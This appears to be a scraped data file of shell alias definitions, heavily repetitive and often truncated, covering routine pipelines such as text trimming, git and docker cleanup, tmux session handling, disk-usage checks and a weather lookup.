3614997,582125,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614961,582124,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614925,582123,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614889,582122,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614853,582121,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614816,582119,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614780,582118,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614744,582116,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614708,582113,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614672,582112,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614636,582110,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614600,582109,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614564,582108,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614528,582107,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614492,582106,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614456,582105,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614420,582104,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614384,582103,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614348,582102,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614309,582098,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614273,582097,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614237,582096,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614201,582093,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614165,582092,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3614127,582089,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3613989,582085,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3613953,582084,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3613917,582083,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3613881,582082,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3613845,582081,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3613809,582080,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3613773,582079,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3613736,582077,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3613700,582076,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3613647,582074,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3613611,582073,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3613575,582072,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3613488,582070,ll,ls -l | grep -v -E """".pyc$|~$"""""""
3613468,582069,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573965,576198,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573870,576184,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573824,576173,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573787,576171,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573751,576170,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573714,576168,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573678,576167,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573640,576163,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573600,576158,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573564,576157,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573515,576143,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573479,576142,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573443,576141,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573407,576140,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573371,576139,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573335,576138,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573299,576137,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573263,576136,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573227,576135,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573191,576134,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573155,576133,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573117,576130,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573081,576129,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573045,576128,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3573009,576127,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3572973,576126,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3572937,576125,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3572802,576122,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3572766,576121,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3572730,576120,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
355516,109407,weather,curl -s ipinfo.io/$1 | curl -s wttr.in/$1 | head -n 38"""
348618,108091,vi,vim || alias vim=vi"""
3438300,541404,..,command .. 2>/dev/null || cd $(dirname $PWD)"""
3400955,535587,matrix,LC_ALL=C tr -c """"[:digit:]"""" """" """" < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR=""""1;32"""" grep --color """"[^ ]"""""""
3321715,527965,gufeng,find /media/others/KuGou/古风/| grep mp3 | shuf > /tmp/mp3.lst;mpv --playlist=/tmp/mp3.lst"""
3321696,527964,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3321660,527963,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3321543,527959,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3321213,527943,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3321177,527941,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3321101,527935,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3321064,527933,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320927,527927,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320891,527926,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320854,527924,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320818,527922,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320782,527921,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320746,527920,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320710,527919,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320674,527918,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320638,527917,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320602,527916,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320530,527914,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320428,527911,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320392,527910,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320356,527909,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320320,527908,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320284,527907,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320248,527906,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320212,527905,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320140,527903,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320104,527900,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320068,527899,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3320032,527898,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319960,527896,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319924,527895,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319888,527894,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319852,527893,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319816,527892,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319780,527890,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319744,527889,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319708,527888,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319672,527887,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319636,527886,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319600,527885,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319564,527884,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319528,527883,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319492,527882,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319456,527881,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319420,527880,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319384,527879,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319348,527877,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319312,527876,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319276,527875,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319240,527874,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319204,527873,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319168,527872,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319132,527871,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319096,527870,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319060,527869,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3319024,527868,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318988,527867,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318952,527866,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318916,527865,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318877,527861,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318841,527859,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318805,527858,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318769,527857,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318733,527856,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318697,527855,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318661,527854,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318625,527853,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318588,527851,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318552,527850,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318516,527849,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318407,527774,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318371,527773,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318335,527771,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318299,527770,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318263,527769,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318227,527768,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318190,527766,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318154,527765,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318118,527764,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318082,527762,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3318010,527759,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317974,527758,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317938,527757,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317902,527755,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317866,527754,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317830,527753,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317794,527752,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317758,527751,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317722,527750,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317650,527748,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317614,527747,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317578,527746,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317542,527745,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317506,527744,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317470,527743,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317434,527742,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317398,527741,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317362,527739,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317326,527737,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317290,527736,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317254,527735,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317218,527733,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317182,527732,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317146,527731,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317110,527730,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317073,527727,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317037,527726,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3317001,527725,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316965,527724,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316929,527723,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316893,527722,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316857,527721,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316821,527720,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316749,527717,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316713,527716,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316677,527715,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316641,527714,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316517,527707,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316481,527706,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316439,527703,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316403,527702,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316367,527701,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316331,527700,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316295,527699,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316259,527698,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316223,527697,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316187,527696,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316151,527695,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316115,527694,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316079,527692,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316043,527691,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3316006,527688,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3315928,527684,findbig,find . -type f -exec ls -s {} \; | sort -n -r | head -5"""
3315728,527678,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3315692,527677,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3315603,527674,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3315553,527672,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3314052,527438,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3313937,527376,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287853,525395,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287550,525333,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287516,525332,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287480,525327,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287446,525326,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287412,525325,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287364,525323,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287313,525318,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287279,525317,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287231,525315,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287197,525314,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287163,525313,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287129,525312,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287095,525311,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287061,525310,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3287027,525309,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286993,525308,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286959,525307,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286925,525306,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286891,525305,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286857,525304,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286823,525303,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286779,525293,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286745,525292,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286711,525291,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286677,525290,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286643,525289,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286609,525288,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286575,525287,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286541,525286,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286507,525285,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286470,525282,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286435,525280,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286388,525277,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286354,525276,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286320,525275,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286273,525273,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286239,525272,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286205,525270,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286171,525269,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286137,525268,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286103,525267,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286053,525265,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3286019,525264,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3285909,525254,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3285875,525251,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3285777,525245,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3222326,516466,killwebpack,kill $(ps aux | grep webpack | awk """"{print $2}"""")"""
3028962,497367,vi,$(whence -p vim || whence -p vi)"""
301930,102664,tkas,tmux ls | cut -d """" """" -f 1 | while read session; do tmux kill-session -t ${session%*:}; done"""
2>/dev/null cat $(plog) | grep completed\. | wc -l
2>&1|(cat 1>&2|xsel -bi)2>&1
2>&1 | pygmentize | less
2>&1 | pasteit | pbcopy && pbpaste;
2>&1 | asan_symbolize.py | c++filt
2>&1 | (cat 1>&2 | xsel -bi) 2>&1
2835472,479070,seecode,getList() { agrep unequippedModules . | termenu -m -o | awk -F """
2816029,477063,sleep,cat .sleep 2> ~/X || \"
2782185,471532,gc,git gc --aggressive && git remote prune origin && git branch --merged master | grep -v 'master$' | xargs git branch -d"""
2698777,457154,sleep,cat .sleep 2> ~/X || \"
2652760,450667,sleep,cat .sleep 2> ~/X || \"
2590591,441817,sleep,cat .sleep 2> ~/X || \"
2589150,441586,sleep,cat .sleep 2> ~/X || \"
2585669,440911,sleep,cat .sleep 2> ~/X || \"
2474038,427808,svn-cd,svn diff | colordiff | less -R"""
2460747,425989,duch,du -ch | grep insgesamt |\"
2400776,420159,iip,ifconfig | grep -A 1 en1 | grep -e \"""
2394664,419325,chpro,ps aux | grep $LOGNAME | grep -v root"""
2312039,409314,tf2,mkfifo /tmp/tf2fifo; /bin/bash /home/barnex/.local/share/Steam/SteamApps/common/Team\ Fortress\ 2/hl2.sh -game tf -steam -dxlevel 81 -full -console -novid -useforcedmparms -noforcemaccel -noforcemspd -w 1280 -h 720 < /tmp/tf2fifo| tee /tmp/tf2log | ruby pytania.rb > /tmp/tf2fifo & echo 'alias odp say' """
2249183,399522,duch,du -ch | grep insgesamt |\"
2185517,388060,FF,| sed 's/\([^:]* \|^\)\([-\/a-zA-Z0-9_\.]\+:[0-9]\+\).*/\2/'"""
216;echo;echo Show Pacific\' 32MB 216 pin svn path:;echo;svn info | egrep URL | awk '{print $2}';echo;cd-
2165549,384935,dockerclean,dockercleanc || true && dockercleani"""
2094093,381585,ifactive,ifconfig | pcregrep -M -o '^[^\t:]+:([^\n]|\n\t)*status: active'"""
1982078,367236,cmdprofile,history | awk '{print \$2}' | awk 'BEGIN{FS=\"""
1790800,333466,duch,du -ch | grep insgesamt |\"
1606628,321983,apuu,opkg list-upgradable | awk '\{ print $1; \}' | xargs opkg upgrade"""
1606556,321966,gbD,deleteBranch() { gb -D """"$1"""" || true && gb -Dr origin/""""$1"""" }; deleteBranch"""
1568276,314868,tmux,tmux attach || tmux new-session \; source-file ~/.tmux/session"""
1557926,312192,sleep,cat .sleep 2> ~/X || \"
1432482,289943,duch,du -ch | grep insgesamt |\"
1432211,289927,duch,du -ch | grep insgesamt |\"
1288003,267261,fgs,git show $(git lg | fzf --ansi --multi --prompt """"git show> """" | \"
1265802,263855,duch,du -ch | grep insgesamt |\"
1219422,256885,ggg,git add --all | git commit -m """"auto update"""" | git push"""
1182142,251848,pubkey,more ~/.ssh/id_rsa.pub | pbcopy | printf '=> Public key copied to pasteboard.\n'"""
1174918,251178,cdroot,cd $(git rev-parse --show-toplevel || echo """"."""")"""
100;echo;echo Show Pacific\' no DDR 100 pin svn path:;echo;svn info | egrep URL | awk '{print $2}';echo;cd-
/usr/ucb/ps -algxwww | /bin/grep -v -- grep | egrep
